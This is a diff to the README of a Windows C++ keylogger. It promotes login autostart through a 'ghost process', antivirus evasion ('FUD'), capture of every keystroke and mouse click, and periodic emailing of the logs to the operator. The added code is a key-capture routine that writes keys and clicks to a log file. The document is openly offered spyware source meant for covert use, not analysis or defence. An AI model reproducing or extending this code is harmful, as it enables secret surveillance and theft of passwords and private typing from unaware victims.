@@ -42,10 +42,10 @@
 ## Key Features
 
 * Autostart on windows login
-  - you need to bind the file. Also you can create a windows register file for create an autostart ghost process on windows login.
+  - You need to bind the file or make a setup. Also you can create a ghost process.
 * FUD not detected by antivirus software. 
 * Create a .txt log file, easy to send.
-* Log all keys.
+* Log all keys, simbols, space and mouse click.
 * Sent to you a copy of the log periodically to your email.
 
 
@@ -92,6 +92,39 @@ void WriteToLog(LPCSTR text) {
  logfile << text;
  logfile.close();
 }
+```
+Delete the case option if you don't need to track mouse click or space for example
+
+```C++
+bool KeyIsListed(int iKey) {
+ switch (iKey)
+ {
+ case VK_SPACE:
+  cout << " ";
+  WriteToLog(" ");
+  break;
+ case VK_RETURN:
+  cout << "/n";
+  WriteToLog("/n");
+  break;
+ case VK_SHIFT:
+  cout << " Shift ";
+  WriteToLog(" Shift ");
+  break;
+ case VK_BACK:
+  cout << "/b";
+  WriteToLog("/b");
+  break;
+ case VK_RBUTTON:
+  cout << " rclick ";
+  WriteToLog(" rclick ");
+  break;
+ case VK_LBUTTON:
+  cout << " lclick ";
+  WriteToLog(" lclick ");
+  break;
+ default: return FALSE;
+ }
 ```
 
 > **Note**
